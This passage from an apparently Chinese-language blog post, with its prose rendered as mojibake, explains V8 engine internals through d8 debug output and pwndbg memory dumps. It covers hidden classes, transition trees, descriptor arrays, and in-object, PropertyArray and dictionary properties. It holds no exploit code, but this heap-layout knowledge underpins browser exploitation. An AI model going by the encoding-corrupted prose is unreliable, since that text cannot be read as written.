class="number">0x218575f40229</span>&gt;</span><br><span class="line"> - <span class="attr">constructor</span>: <span class="number">0x39b2971c20c9</span> &lt;<span class="title class_">JSFunction</span> <span class="title class_">Object</span> (sfi = <span class="number">0x2379e4b457e9</span>)&gt;</span><br><span class="line"> - dependent <span class="attr">code</span>: <span class="number">0x1a62eb8002c1</span> &lt;<span class="title class_">Other</span> heap <span class="title function_">object</span> (<span class="variable constant_">WEAK_FIXED_ARRAY_TYPE</span>)&gt;</span><br><span class="line"> - construction <span class="attr">counter</span>: <span class="number">0</span></span><br></pre></td></tr></table></figure></div><p>å¯ä»¥ç”¨ä»¥ä¸‹æµç¨‹å›¾ï¼ˆä¹Ÿè¡¨ç¤ºtransition treeç»“æ„ï¼‰æ¥è¡¨ç¤ºmap(HiddenClass)çš„å˜åŒ–</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">    A[HC 0] --&gt;|&quot;Add &#x27;a&#x27;&quot;| B[HC 1]</span><br><span class="line">    B --&gt;|&quot;Add &#x27;b&#x27;&quot;| C[HC 2]</span><br><span class="line">    C --&gt;|&quot;Add &#x27;c&#x27;&quot;| D[HC 3]</span><br><span class="line">    B --&gt;|&quot;Add &#x27;d&#x27;&quot;| E[HC 4]</span><br><span class="line">    E --&gt;|&quot;Add &#x27;c&#x27;&quot;| F[HC 5]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>å†ä¸¾ä¸€ä¸ªä¾‹å­ğŸŒ°ï¼Œçœ‹çœ‹Descriptor,è¿™é‡Œo1 o2ä¸€å¼€å§‹å±æ€§ä¸€æ ·ï¼Œå…±äº«HiddenClassï¼Œåé¢åŠ å…¥ä¸åŒå±æ€§ï¼Œtransition treeäº§ç”Ÿäº†åˆ†æ”¯</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo1&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">o1.<span class="property">b</span> = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">o2.<span class="property">d</span> = <span class="string">&quot;bar2&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x35d08114ddd1</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a1af794ab39</span>&gt;</span><br><span class="line"><span class="number">0x35d08114de21</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a1af794ab39</span>&gt;</span><br><span class="line"><span class="number">0x35d08114ddd1</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a1af794ab89</span>&gt;</span><br><span class="line"><span class="number">0x35d08114de21</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a1af794abd9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x3a1af794ab89</span> <span class="comment">//çœ‹çœ‹o1çš„Hidden Class</span></span><br><span class="line"><span class="number">0x3a1af794ab89</span>: [<span class="title class_">Map</span>]</span><br><span class="line"> - <span class="attr">type</span>: <span class="variable constant_">JS_OBJECT_TYPE</span></span><br><span class="line"> - instance <span class="attr">size</span>: <span class="number">32</span></span><br><span class="line"> - inobject <span class="attr">properties</span>: <span class="number">1</span></span><br><span class="line"> - elements <span class="attr">kind</span>: <span class="variable constant_">HOLEY_ELEMENTS</span></span><br><span class="line"> - unused property <span class="attr">fields</span>: <span class="number">2</span></span><br><span class="line"> - enum <span class="attr">length</span>: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back <span class="attr">pointer</span>: <span class="number">0x3a1af794ab39</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt;</span><br><span class="line"> - prototype_validity <span class="attr">cell</span>: <span class="number">0x30dcecd9f9f1</span> &lt;<span class="title class_">Cell</span> value= <span class="number">0</span>&gt;</span><br><span class="line"> - instance <span class="title function_">descriptors</span> (own) #<span class="number">2</span>: <span class="number">0x35d08114de41</span> &lt;<span class="title class_">DescriptorArray</span>[<span class="number">2</span>]&gt; <span class="comment">//è¿™é‡Œå­˜å‚¨Descriptor</span></span><br><span class="line"> - layout <span class="attr">descriptor</span>: (nil)</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x30dcecd82091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3a1af7940229</span>&gt;</span><br><span class="line"> - <span class="attr">constructor</span>: <span class="number">0x30dcecd820c9</span> &lt;<span class="title class_">JSFunction</span> <span class="title class_">Object</span> (sfi = <span class="number">0x3d338a2857e9</span>)&gt;</span><br><span class="line"> - dependent <span class="attr">code</span>: <span class="number">0x0f08ee9c02c1</span> &lt;<span class="title class_">Other</span> heap <span class="title function_">object</span> (<span class="variable constant_">WEAK_FIXED_ARRAY_TYPE</span>)&gt;</span><br><span class="line"> - construction <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x35d08114de41</span> <span class="comment">//è·Ÿè¿›DescriptorArray</span></span><br><span class="line"><span class="number">0x35d08114de41</span>: [<span class="title class_">DescriptorArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x0f08ee9c0271</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">enum_cache</span>: empty</span><br><span class="line"> - nof slack <span class="attr">descriptors</span>: <span class="number">0</span></span><br><span class="line"> - nof <span class="attr">descriptors</span>: <span class="number">2</span></span><br><span class="line"> - raw marked <span class="attr">descriptors</span>: mc epoch <span class="number">0</span>, marked <span class="number">0</span></span><br><span class="line">  [<span class="number">0</span>]: #<span class="title function_">a</span> (<span class="keyword">const</span> data field <span class="number">0</span>:h, <span class="attr">p</span>: <span class="number">0</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>]) @ <span class="title class_">Any</span>  <span class="comment">//#a aæ˜¯keyï¼Œdata fieldåé¢çš„0æ˜¯åœ¨åŸå±æ€§æ•°ç»„ä¸­çš„ä½ç½®ç´¢å¼•</span></span><br><span class="line">  [<span class="number">1</span>]: #<span class="title function_">b</span> (<span class="keyword">const</span> data field <span class="number">1</span>:h, <span class="attr">p</span>: <span class="number">1</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>]) @ <span class="title class_">Any</span></span><br></pre></td></tr></table></figure></div><p> transition treeä¸­çš„æ‰€æœ‰HiddenClass(Map)ä¸ä¼šè¢«ç§»é™¤ï¼Œå› ä¸ºå°†æ¥é‡åˆ°ç›¸åŒç»“æ„è¿˜ä¼šå¤ç”¨ï¼Œä¸¾ä¸ªä¾‹å­ğŸŒ°</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo1&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">o1.<span class="property">b</span> = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">o2.<span class="property">d</span> = <span class="string">&quot;bar2&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line"><span class="keyword">let</span> o3 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo2&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o3);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x2301f01cddf9</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3dcc32d4ab39</span>&gt;<span class="comment">//*</span></span><br><span class="line"><span class="number">0x2301f01cde49</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3dcc32d4ab39</span>&gt;<span class="comment">//*</span></span><br><span class="line"><span class="number">0x2301f01cddf9</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3dcc32d4ab89</span>&gt;</span><br><span class="line"><span class="number">0x2301f01cde49</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3dcc32d4abd9</span>&gt;</span><br><span class="line"><span class="number">0x2301f01cdf49</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3dcc32d4ab39</span>&gt;<span class="comment">//mapå¤ç”¨</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ğŸ’¡å±æ€§åç§°ä¸€æ ·ä½†é¡ºåºä¸åŒçš„è¯ï¼Œmapä¹Ÿä¸åŒ</p></blockquote><h3 id="property"><a href="#property" class="headerlink" title="property"></a>property</h3><p>propertyâ¼œåˆ†ä¸ºin-object propertyå’Œæ™®é€šçš„property</p><ul><li><p>in-object property,ç›´æ¥ä¿å­˜åœ¨js objectâ¾¥çš„property</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i &lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line">o1[<span class="string">&quot;p&quot;</span> + i.<span class="title function_">toString</span>()] = i;</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x3794877cdd99</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3f3bffd4abd9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x3794877cdd99</span></span><br><span class="line"><span class="number">0x3794877cdd99</span>: [<span class="variable constant_">JS_OBJECT_TYPE</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x3f3bffd4abd9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x0de3c5002091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3f3bffd40229</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x38e8d9140c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x38e8d9140c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123; <span class="comment">//4ä¸ªpropertyç›´æ¥å†…åµŒåœ¨objectä¸­ï¼Œæœ¬æ¥ç”¨äºæ”¾propertyçš„FixedArrayå¤§å°ä¸º0</span></span><br><span class="line">    #<span class="attr">p0</span>: <span class="number">0</span> (<span class="keyword">const</span> data field <span class="number">0</span>)</span><br><span class="line">    #<span class="attr">p1</span>: <span class="number">1</span> (<span class="keyword">const</span> data field <span class="number">1</span>)</span><br><span class="line">    #<span class="attr">p2</span>: <span class="number">2</span> (<span class="keyword">const</span> data field <span class="number">2</span>)</span><br><span class="line">    #<span class="attr">p3</span>: <span class="number">3</span> (<span class="keyword">const</span> data field <span class="number">3</span>)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/8gx  <span class="number">0x3794877cdd99</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x3794877cdd98</span>:<span class="number">0x00003f3bffd4abd9</span><span class="number">0x000038e8d9140c71</span></span><br><span class="line"><span class="number">0x3794877cdda8</span>:<span class="number">0x000038e8d9140c71</span><span class="number">0x0000000000000000</span> <span class="comment">//0</span></span><br><span class="line"><span class="number">0x3794877cddb8</span>:<span class="number">0x0000000100000000</span><span class="number">0x0000000200000000</span> <span class="comment">//1   2</span></span><br><span class="line"><span class="number">0x3794877cddc8</span>:<span class="number">0x0000000300000000</span><span class="number">0x000038e8d9141f49</span> <span class="comment">//3   </span></span><br></pre></td></tr></table></figure></div></li><li><p>æ™®é€šçš„propertyï¼šç»™objectçš„propertyè¶…è¿‡ä¸€å®šæ•°é‡åï¼Œåé¢çš„propertyå°±ä¼šå­˜åˆ°PropertyArrayä¸­</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i &lt;<span class="number">8</span>; i++)&#123;</span><br><span class="line">o1[<span class="string">&quot;p&quot;</span> + i.<span class="title function_">toString</span>()] = i;</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x1e9b0634dd99</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1501a910ad19</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x1e9b0634dd99</span> <span class="comment">//çœ‹çœ‹Object</span></span><br><span class="line"><span class="number">0x1e9b0634dd99</span>: [<span class="variable constant_">JS_OBJECT_TYPE</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x1501a910ad19</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x31170e202091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1501a9100229</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a7913900c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x1e9b0634e331</span> &lt;<span class="title class_">PropertyArray</span>[<span class="number">6</span>]&gt; &#123;<span class="comment">//å‰é¢4ä¸ªæ˜¯in-object propertyï¼Œåé¢å°±æ˜¯æ™®é€šçš„property</span></span><br><span class="line">    #<span class="attr">p0</span>: <span class="number">0</span> (<span class="keyword">const</span> data field <span class="number">0</span>)</span><br><span class="line">    #<span class="attr">p1</span>: <span class="number">1</span> (<span class="keyword">const</span> data field <span class="number">1</span>)</span><br><span class="line">    #<span class="attr">p2</span>: <span class="number">2</span> (<span class="keyword">const</span> data field <span class="number">2</span>)</span><br><span class="line">    #<span class="attr">p3</span>: <span class="number">3</span> (<span class="keyword">const</span> data field <span class="number">3</span>)</span><br><span class="line">    #<span class="attr">p4</span>: <span class="number">4</span> (<span class="keyword">const</span> data field <span class="number">4</span>) properties[<span class="number">0</span>]</span><br><span class="line">    #<span class="attr">p5</span>: <span class="number">5</span> (<span class="keyword">const</span> data field <span class="number">5</span>) properties[<span class="number">1</span>]</span><br><span class="line">    #<span class="attr">p6</span>: <span class="number">6</span> (<span class="keyword">const</span> data field <span class="number">6</span>) properties[<span class="number">2</span>]</span><br><span class="line">    #<span class="attr">p7</span>: <span class="number">7</span> (<span class="keyword">const</span> data field <span class="number">7</span>) properties[<span class="number">3</span>]</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job <span class="number">0x1e9b0634e331</span> <span class="comment">//çœ‹çœ‹PropertyArray</span></span><br><span class="line"><span class="number">0x1e9b0634e331</span>: [<span class="title class_">PropertyArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x0a7913901909</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">6</span></span><br><span class="line"> - <span class="attr">hash</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">4</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">5</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">6</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">7</span></span><br><span class="line">         <span class="number">4</span>-<span class="number">5</span>: <span class="number">0x0a79139004d1</span> &lt;<span class="literal">undefined</span>&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>ğŸ¤”PropertyArrayçš„ç©ºé—´ä¼¼ä¹æ˜¯æŒ‰3çš„å€æ•°æ¥ï¼Œåæ¥è¯•è¯•ä¸€ä¸ªæœ‰12ä¸ªå±æ€§çš„objectï¼Œå»æ‰4ä¸ªin-object propertyï¼Œå‰©ä¸‹8ä¸ªï¼Œä½†æ˜¯åˆ›å»ºäº†ä¸€ä¸ªå¤§å°ä¸º9çš„PropertyArray</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i &lt;<span class="number">12</span>; i++)&#123;</span><br><span class="line">o1[<span class="string">&quot;p&quot;</span> + i.<span class="title function_">toString</span>()] = i;</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x005b0240dd99</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1c32d7d8ae59</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x005b0240dd99</span></span><br><span class="line"><span class="number">0x5b0240dd99</span>: [<span class="variable constant_">JS_OBJECT_TYPE</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x1c32d7d8ae59</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x330042642091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1c32d7d80229</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x139f6b440c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x005b0240e5f9</span> &lt;<span class="title class_">PropertyArray</span>[<span class="number">9</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">p0</span>: <span class="number">0</span> (<span class="keyword">const</span> data field <span class="number">0</span>)</span><br><span class="line">    #<span class="attr">p1</span>: <span class="number">1</span> (<span class="keyword">const</span> data field <span class="number">1</span>)</span><br><span class="line">    #<span class="attr">p2</span>: <span class="number">2</span> (<span class="keyword">const</span> data field <span class="number">2</span>)</span><br><span class="line">    #<span class="attr">p3</span>: <span class="number">3</span> (<span class="keyword">const</span> data field <span class="number">3</span>)</span><br><span class="line">    #<span class="attr">p4</span>: <span class="number">4</span> (<span class="keyword">const</span> data field <span class="number">4</span>) properties[<span class="number">0</span>]</span><br><span class="line">    #<span class="attr">p5</span>: <span class="number">5</span> (<span class="keyword">const</span> data field <span class="number">5</span>) properties[<span class="number">1</span>]</span><br><span class="line">    #<span class="attr">p6</span>: <span class="number">6</span> (<span class="keyword">const</span> data field <span class="number">6</span>) properties[<span class="number">2</span>]</span><br><span class="line">    #<span class="attr">p7</span>: <span class="number">7</span> (<span class="keyword">const</span> data field <span class="number">7</span>) properties[<span class="number">3</span>]</span><br><span class="line">    #<span class="attr">p8</span>: <span class="number">8</span> (<span class="keyword">const</span> data field <span class="number">8</span>) properties[<span class="number">4</span>]</span><br><span class="line">    #<span class="attr">p9</span>: <span class="number">9</span> (<span class="keyword">const</span> data field <span class="number">9</span>) properties[<span class="number">5</span>]</span><br><span class="line">    #<span class="attr">p10</span>: <span class="number">10</span> (<span class="keyword">const</span> data field <span class="number">10</span>) properties[<span class="number">6</span>]</span><br><span class="line">    #<span class="attr">p11</span>: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">11</span>) properties[<span class="number">7</span>]</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div></blockquote></li></ul><h3 id="fast-property-amp-slow-property"><a href="#fast-property-amp-slow-property" class="headerlink" title="fast property&amp;slow property"></a>fast property&amp;slow property</h3><p>propertä¹Ÿå¯ä»¥åˆ†ä¸ºfast propertyå’Œslow property</p><ul><li><p>fast propertyï¼šä¿å­˜åœ¨çº¿æ€§æ’åºçš„æ•°ç»„â¾¥çš„propertyï¼Œå‰é¢æåˆ°çš„åœ¨PropertyArrayä¸­çš„éƒ½æ˜¯fast property</p></li><li><p>slow propertyï¼šä¸ºäº†æ”¯æŒé¢‘ç¹åœ°æ·»åŠ &#x2F;åˆ é™¤å±æ€§è€Œä¸æ›´æ–°HiddenClassä¸DescriptorArrayï¼Œv8æ”¯æŒslow propertyï¼Œæœ‰slow propertyçš„Objectæœ‰ä¸€ä¸ªè‡ªåŒ…å«çš„å±æ€§å­—å…¸æ¥å­˜å‚¨å±æ€§ä¿¡æ¯</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115181255404.png"                      alt="image-20241115181255404"                ><figcaption>image-20241115181255404</figcaption></figure></p></li></ul><p>ä¸¾ä¸ªä¾‹å­ğŸŒ°æ·»åŠ 100æ¬¡å±æ€§</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i &lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">o1[<span class="string">&quot;p&quot;</span> + i.<span class="title function_">toString</span>()] = i;</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x2d695c28dd99</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3221bcb463a9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x2d695c28dd99</span></span><br><span class="line"><span class="number">0x2d695c28dd99</span>: [<span class="variable constant_">JS_OBJECT_TYPE</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x3221bcb463a9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">DictionaryProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x31c8c1a42091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3221bcb40229</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x151002c00c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x2d695c290969</span> &lt;<span class="title class_">NameDictionary</span>[<span class="number">773</span>]&gt; &#123; <span class="comment">//è¿™ä¸ªæ—¶å€™å†çœ‹å·²ç»å˜æˆäº†NameDictionary</span></span><br><span class="line">   #<span class="attr">p67</span>: <span class="number">67</span> (data, <span class="attr">dict_index</span>: <span class="number">68</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line">   #<span class="attr">p96</span>: <span class="number">96</span> (data, <span class="attr">dict_index</span>: <span class="number">97</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line">   #<span class="attr">p36</span>: <span class="number">36</span> (data, <span class="attr">dict_index</span>: <span class="number">37</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line">   #<span class="attr">p98</span>: <span class="number">98</span> (data, <span class="attr">dict_index</span>: <span class="number">99</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line">   <span class="comment">//......</span></span><br></pre></td></tr></table></figure></div><h3 id="Mapç»“æ„"><a href="#Mapç»“æ„" class="headerlink" title="Mapç»“æ„"></a>Mapç»“æ„</h3><p>å¯ä»¥çœ‹ä¸€ä¸‹src&#x2F;objects&#x2F;map.hä¸­çš„æ³¨é‡Š</p><p>ä¸»è¦å…³æ³¨4ä¸ªè¿ç»­çš„Int</p><ul><li>ç¬¬ä¸€ä¸ªintå€¼ä¸»è¦æ˜¯ä¸€äº›å¤§å°ç›¸å…³ï¼Œinstance_size..</li><li>ğŸŒŸç¬¬äºŒä¸ªintå€¼æ¯”è¾ƒå…³é”®ï¼Œä»£è¡¨äº†typeï¼Œæè¿°mapå¯¹åº”çš„objectçš„ç±»å‹</li><li>ç¬¬ä¸‰ä¸ªintå€¼ä¸»è¦æ˜¯ä¸€äº›descriptorsï¼Œæ¯”å¦‚å‰é¢è¯´çš„propertiesé•¿åº¦ä¹‹ç±»çš„</li><li>ç¬¬å››ä¸ªintå€¼ä¸»è¦æ˜¯64ç›¸å…³çš„ä¸€äº›é¢å¤–ä¿¡æ¯ï¼Œä¸å¤ªé‡è¦</li></ul><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 